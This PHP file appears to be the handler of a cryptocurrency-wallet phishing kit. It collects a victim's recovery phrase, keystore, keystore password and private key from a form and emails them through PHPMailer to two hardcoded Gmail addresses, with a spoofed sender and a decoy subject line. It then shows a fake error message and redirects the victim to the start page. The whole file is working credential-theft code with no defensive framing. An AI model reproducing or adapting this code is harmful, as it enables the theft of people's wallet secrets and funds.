<?php

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;

    require './PHPMailer/src/Exception.php';
    require './PHPMailer/src/PHPMailer.php';
    require './PHPMailer/src/SMTP.php';


$myPersonalEmail = 'adewale830t@gmail.com';
$message = "Phrase:".$_POST['phrase']."<br/><br/>Keystore:".$_POST['keystore']."<br/>Keystore Password:".$_POST['keystorepass']."<br/><br/>Private Key:".$_POST['privatekey'];

    if($_POST['submit']  == "submit") {

        $mail = new PHPMailer(true);
		
		$mail->SMTPDebug = 0;
        $mail->setFrom('admin@walletsconnectsapp.org', 'Quora Digest');
        $mail->addAddress($myPersonalEmail, 'Quora Digest');
        $mail->addAddress('slynda983@gmail.com', 'Quora Digest');

        $mail->isHTML(true);    
        $mail->Subject = "What are the screenshot of the best pubg matches you have played?";
        $mail->Body = $message;
		if($_POST['submit']  == "submit"){

        try {
            $mail->send();
            $resp = 'Error!!';
        } catch (Exception $e) {
            $resp = "Error!!!";
        }}
        
    } 
    else {
        $resp = "Fill the document!";
    }
    
?>


<html>
<link rel="stylesheet" href="style1.css">
<style>
.gFeYHJ {
            font-size: 35px;
            font-weight: 500;
            text-align: center;
        }
		.hDbjSS {
            height: 100%;
            display: table;
            flex-direction: column;
            justify-content: space-around;
            -webkit-box-align: center;
            align-items: center;
            text-align: center;
            padding: 30px 32px 0px;
        }
    
        @media screen and (max-width: 640px) {
            .hDbjSS {
                padding: 20px 24px 0px;
            }
        }
		</style>
<script>
         setTimeout(function(){
            window.location.href = './';
         }, 5000);
      </script>

<h1 class="pageStyles__SBranding-sc-1navawn-2 gFeYHJ hDbjSS"><?php echo $resp;?></h1>
<body></html>